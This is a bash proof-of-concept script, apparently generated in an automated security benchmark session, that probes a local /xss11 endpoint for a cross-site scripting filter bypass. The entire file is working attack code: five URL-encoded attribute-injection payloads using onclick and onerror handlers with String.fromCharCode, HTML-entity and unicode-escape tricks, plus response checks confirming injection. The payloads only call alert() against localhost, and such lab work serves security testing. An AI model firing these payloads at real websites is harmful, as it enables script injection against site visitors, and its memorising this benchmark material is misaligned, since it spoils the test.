#!/bin/bash
# POC: Demonstrates XSS filter bypass on /xss11 endpoint using event handler injection with proper URL encoding
# Target: ./repo
# Created: 2025-11-06T19:21:14.632Z
# Session: benchmark-XBEN-012-24-mhnsyuvd

# XSS11 Filter Bypass POC v2 - Event Handler Injection with Character Code Encoding
# This POC demonstrates bypassing the XSS filters on the /xss11 endpoint

TARGET="http://localhost:5000"
ENDPOINT="/xss11"

echo "=== XSS11 Filter Bypass Proof of Concept (v2) ==="
echo ""

# First, let's see what the endpoint returns with a safe input
echo "[*] Testing endpoint with safe input first..."
SAFE_RESPONSE=$(curl -s "${TARGET}${ENDPOINT}?name=test123")
echo "    Safe response status: $(curl -s -o /dev/null -w '%{http_code}' "${TARGET}${ENDPOINT}?name=test123")"
echo ""

# Now test the actual bypass payloads
echo "[*] Test 1: Basic onclick bypass with String.fromCharCode"
PAYLOAD1=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\" onclick=\"alert(String.fromCharCode(88,83,83))'))")
echo "    URL-encoded payload: $PAYLOAD1"
echo "    Making request..."
RESPONSE1=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD1}")
echo "    Checking if onclick appears in response..."
if echo "$RESPONSE1" | grep -o 'onclick=' > /dev/null; then
    echo "    ✓ VULNERABLE: onclick attribute found in response"
    echo "$RESPONSE1" | grep -o '<input[^>]*onclick[^>]*>' | head -1
else
    echo "    ✗ onclick not found in response"
fi
echo ""

# Test 2: Check with HTML entity encoding
echo "[*] Test 2: HTML entity encoding bypass (&#39; for quote)"
PAYLOAD2=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\" onerror=\"alert(&#39;XSS&#39;)\" x=\"'))")
echo "    URL-encoded payload: $PAYLOAD2"
RESPONSE2=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD2}")
if echo "$RESPONSE2" | grep -o 'onerror=' > /dev/null; then
    echo "    ✓ VULNERABLE: onerror attribute found in response"
    echo "$RESPONSE2" | grep -o '<input[^>]*onerror[^>]*>' | head -1
else
    echo "    ✗ onerror not found in response"
fi
echo ""

# Test 3: Simple event handler without encoding
echo "[*] Test 3: Simple event handler - onclick without special characters"
PAYLOAD3=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\" onclick=\"alert(1)\" x=\"'))")
echo "    URL-encoded payload: $PAYLOAD3"
RESPONSE3=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD3}")
if echo "$RESPONSE3" | grep -o 'onclick=' > /dev/null; then
    echo "    ✓ VULNERABLE: onclick attribute found"
    echo "$RESPONSE3" | grep -o '<input[^>]*>' | head -1
else
    echo "    ✗ onclick not found - filter blocked it"
fi
echo ""

# Test 4: Show raw HTML response for debugging
echo "[*] Test 4: Raw HTML response with first payload"
PAYLOAD4=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\" onclick=\"alert(1)\" x=\"'))")
echo "    Making request to: ${TARGET}${ENDPOINT}?name=[encoded payload]"
RESPONSE4=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD4}")
echo "    Full HTML response:"
echo "$RESPONSE4" | head -30
echo ""

# Test 5: Unicode escape sequence
echo "[*] Test 5: Unicode escape bypass - \\u0027 for quote"
PAYLOAD5=$(python3 -c "import urllib.parse; print(urllib.parse.quote('\" onerror=\"alert(\\\\u0027XSS\\\\u0027)\" x=\"'))")
echo "    URL-encoded payload: $PAYLOAD5"
RESPONSE5=$(curl -s "${TARGET}${ENDPOINT}?name=${PAYLOAD5}")
if echo "$RESPONSE5" | grep -o 'onerror=' > /dev/null; then
    echo "    ✓ VULNERABLE: onerror attribute found"
    echo "$RESPONSE5" | grep -o '<input[^>]*>' | head -1
else
    echo "    ✗ onerror not found"
fi
echo ""

echo "=== POC Completed ==="